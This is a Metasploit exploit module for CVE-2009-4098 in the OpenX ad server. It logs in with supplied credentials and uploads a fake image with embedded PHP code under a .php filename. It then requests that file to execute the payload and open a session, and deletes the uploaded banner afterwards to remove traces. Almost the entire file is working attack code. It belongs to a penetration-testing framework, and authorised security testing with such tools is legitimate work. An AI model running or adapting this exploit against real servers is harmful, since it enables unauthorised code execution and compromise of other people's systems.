##
# $Id: openx_banner_edit.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'OpenX banner-edit.php File Upload PHP Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in the OpenX advertising software.
				In versions prior to version 2.8.2, authenticated users can upload files
				with arbitrary extensions to be used as banner creative content. By uploading
				a file with a PHP extension, an attacker can execute arbitrary PHP code.

				NOTE: The file must also return either "png", "gif", or "jpeg" as its image
				type as returned from the PHP getimagesize() function.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2009-4098' ],
					[ 'OSVDB', '60499' ],
					[ 'BID', '37110' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2009-11/0166.html' ],
					[ 'URL', 'https://developer.openx.org/jira/browse/OX-5747' ],
					[ 'URL', 'http://www.openx.org/docs/2.8/release-notes/openx-2.8.2' ],
					# References for making small images:
					[ 'URL', 'http://php.net/manual/en/function.getimagesize.php' ],
					[ 'URL', 'http://gynvael.coldwind.pl/?id=223' ],
					[ 'URL', 'http://gynvael.coldwind.pl/?id=224' ],
					[ 'URL', 'http://gynvael.coldwind.pl/?id=235' ],
					[ 'URL', 'http://programming.arantius.com/the+smallest+possible+gif' ],
					[ 'URL', 'http://stackoverflow.com/questions/2253404/what-is-the-smallest-valid-jpeg-file-size-in-bytes' ]
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => '-find',
						},
					'Space'       => 1024,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Nov 24 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [true, "OpenX directory path", "/openx/"]),
				OptString.new('USERNAME', [ true, 'The username to authenticate as' ]),
				OptString.new('PASSWORD', [ true, 'The password for the specified username' ]),
				OptString.new('DESC', [ true, 'The description to use for the banner', 'Temporary banner']),
			], self.class)
	end

	def check
		uri = ''
		uri << datastore['URI']
		uri << '/' if uri[-1,1] != '/'
		uri << 'www/admin/'
		res = send_request_raw(
			{
				'uri' => uri
			}, 25)

		if (res and res.body =~ /v.?([0-9]\.[0-9]\.[0-9])/)
			ver = $1
			vers = ver.split('.').map { |v| v.to_i }
			return Exploit::CheckCode::Safe if (vers[0] > 2)
			return Exploit::CheckCode::Safe if (vers[1] > 8)
			return Exploit::CheckCode::Safe if (vers[0] == 2 && vers[1] == 8 && vers[2] >= 2)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit

		# tiny images :)
		tiny_gif = "GIF89a" +
			"\x01\x00\x01\x00\x00" +
			[1,1,0x80|(2**(2+rand(3)))].pack('nnC') +
			"\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
		tiny_png = "\x89PNG\x0d\x0a\x1a\x0a" +
			rand_text_alphanumeric(8) +
			[1,1,0].pack('NNC')
		tiny_jpeg = "\xff\xd8\xff\xff" +
			[0xc0|rand(16), rand(8), 2**(2+rand(3)), 1, 1, 1].pack('CnCnnC')
		tiny_imgs = [ tiny_gif, tiny_png, tiny_jpeg ]

		# Payload
		cmd_php = '<?php ' + payload.encoded + '?>'
		content = tiny_imgs[rand(tiny_imgs.length)] + cmd_php

		# Static files
		img_dir     = 'images/'
		uri_base    = ''
		uri_base << datastore['URI']
		uri_base << '/' if uri_base[-1,1] != '/'
		uri_base << 'www/'

		# Need to login first :-/
		cookie = openx_login(uri_base)
		if (not cookie)
			raise RuntimeError, 'Unable to login!'
		end
		print_status("Logged in successfully (cookie: #{cookie})")

		# Now, check for an advertiser / campaign
		ids = openx_find_campaign(uri_base, cookie)
		if (not ids)
			# TODO: try to add an advertiser and/or campaign
			raise RuntimeError, 'The system has no advertisers or campaigns!'
		end
		adv_id = ids[0]
		camp_id = ids[1]
		print_status("Using advertiser #{adv_id} and campaign #{camp_id}")

		# Add the banner >:)
		ban_id = openx_upload_banner(uri_base, cookie, adv_id, camp_id, content)
		if (not ban_id)
			raise RuntimeError, 'Unable to upload the banner!'
		end
		print_status("Successfully uploaded the banner image with id #{ban_id}")

		# Find the filename
		ban_fname = openx_find_banner_filename(uri_base, cookie, adv_id, camp_id, ban_id)
		if (not ban_fname)
			raise RuntimeError, 'Unable to find the banner filename!'
		end
		print_status("Resolved banner id to name: #{ban_fname}")

		# Request it to trigger the payload
		res = send_request_raw({
				'uri' => uri_base + 'images/' + ban_fname + '.php'
			})

		# Delete the banner :)
		if (not openx_banner_delete(uri_base, cookie, adv_id, camp_id, ban_id))
			print_error("WARNING: Unable to automatically delete the banner :-/")
		else
			print_status("Successfully deleted banner # #{ban_id}")
		end

		print_status("You should have a session now.")

		handler

	end


	def openx_login(uri_base)

		res = send_request_raw(
			{
				'uri' => uri_base + 'admin/index.php'
			}, 10)
		if not (res and res.body =~ /oa_cookiecheck\" value=\"([^\"]+)\"/)
			return nil
		end
		cookie = $1

		res = send_request_cgi(
			{
				'method'    => 'POST',
				'uri'       => uri_base + 'admin/index.php',
				'vars_post' =>
					{
						'oa_cookiecheck' => cookie,
						'username' => datastore['USERNAME'],
						'password' => datastore['PASSWORD'],
						'login' => 'Login'
					},
				'headers'   =>
					{
						'Cookie'  => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					},
			}, 10)
		if (not res or res.code != 302)
			return nil
		end

		# return the cookie
		cookie
	end


	def openx_find_campaign(uri_base, cookie)
		res = send_request_raw(
			{
				'uri' => uri_base + 'admin/advertiser-campaigns.php',
				'headers' =>
					{
						'Cookie' => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					},
			})
		if not (res and res.body =~ /campaign-edit\.php\?clientid=([^&])&campaignid=([^\'])\'/)
			return nil
		end

		adv_id = $1.to_i
		camp_id = $2.to_i

		[ adv_id, camp_id ]
	end


	def mime_field(boundary, name, data, filename = nil, type = nil)
		ret = ''
		ret << '--' + boundary + "\r\n"
		ret << "Content-Disposition: form-data; name=\"#{name}\""
		if (filename)
			ret << "; filename=\"#{filename}\""
		end
		ret << "\r\n"
		if (type)
			ret << "Content-Type: #{type}\r\n"
		end
		ret << "\r\n"
		ret << data + "\r\n"
		ret
	end


	def openx_upload_banner(uri_base, cookie, adv_id, camp_id, code_img)
		# Generate some random strings
		boundary    = ('-' * 8) + rand_text_alphanumeric(32)
		cmdscript   = rand_text_alphanumeric(8+rand(8))

		# Upload payload (file ending .php)
		data = ""
		data << mime_field(boundary, "_qf__bannerForm", "")
		data << mime_field(boundary, "clientid", adv_id.to_s)
		data << mime_field(boundary, "campaignid", camp_id.to_s)
		data << mime_field(boundary, "bannerid", "")
		data << mime_field(boundary, "type", "web")
		data << mime_field(boundary, "status", "")
		data << mime_field(boundary, "MAX_FILE_SIZE", "2097152")
		data << mime_field(boundary, "replaceimage", "t")
		data << mime_field(boundary, "replacealtimage", "t")
		data << mime_field(boundary, "description", datastore['DESC'])
		data << mime_field(boundary, "upload", code_img, "#{cmdscript}.php", "application/octet-stream")
		data << mime_field(boundary, "checkswf", "1")
		data << mime_field(boundary, "uploadalt", "", "", "application/octet-stream")
		data << mime_field(boundary, "url", "http://")
		data << mime_field(boundary, "target", "")
		data << mime_field(boundary, "alt", "")
		data << mime_field(boundary, "statustext", "")
		data << mime_field(boundary, "bannertext", "")
		data << mime_field(boundary, "keyword", "")
		data << mime_field(boundary, "weight", "1")
		data << mime_field(boundary, "comments", "")
		data << mime_field(boundary, "submit", "Save changes")
		#data << mime_field(boundary, "", "")
		data << '--' + boundary + '--'

		res = send_request_raw(
			{
				'uri'     => uri_base + "admin/banner-edit.php",
				'method'  => 'POST',
				'data'    => data,
				'headers' =>
					{
						'Content-Length' => data.length,
						'Content-Type'   => 'multipart/form-data; boundary=' + boundary,
						'Cookie'         => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					}
			}, 25)

		if not (res and res.code == 302 and res.headers['Location'] =~ /campaign-banners\.php/)
			return nil
		end

		# Ugh, now we have to get the banner id!
		res = send_request_raw(
			{
				'uri'     => uri_base + "admin/campaign-banners.php?clientid=#{adv_id}&campaignid=#{camp_id}",
				'method'  => 'GET',
				'headers' =>
					{
						'Cookie' => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					}
			})

		if not (res and res.body.length > 0)
			return nil
		end

		res.body.each_line { |ln|
			# make sure the title we used is on this line
			regexp = Regexp.escape(datastore['DESC'])
			next if not (ln =~ /#{regexp}/)

			next if not (ln =~ /banner-edit\.php\?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=([^\']+)\'/)

			# found it! (don't worry about dupes)
			return $1.to_i
		}

		# Didn't find it :-/
		nil
	end


	def openx_find_banner_filename(uri_base, cookie, adv_id, camp_id, ban_id)
		# Ugh, now we have to get the banner name too!
		res = send_request_raw(
			{
				'uri'     => uri_base + "admin/banner-edit.php?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=#{ban_id}",
				'method'  => 'GET',
				'headers' =>
					{
						'Cookie' => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					}
			})

		if not (res and res.body =~ /\/www\/images\/([0-9a-f]+)\.php/)
			return nil
		end

		return $1
	end


	def openx_banner_delete(uri_base, cookie, adv_id, camp_id, ban_id)
		res = send_request_raw(
			{
				'uri'     => uri_base + "admin/banner-delete.php?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=#{ban_id}",
				'method'  => 'GET',
				'headers' =>
					{
						'Cookie' => "sessionID=#{cookie}; PHPSESSID=#{cookie}",
					}
			})

		if not (res and res.code == 302 and res.headers['Location'] =~ /campaign-banners\.php/)
			return nil
		end

		true
	end

end
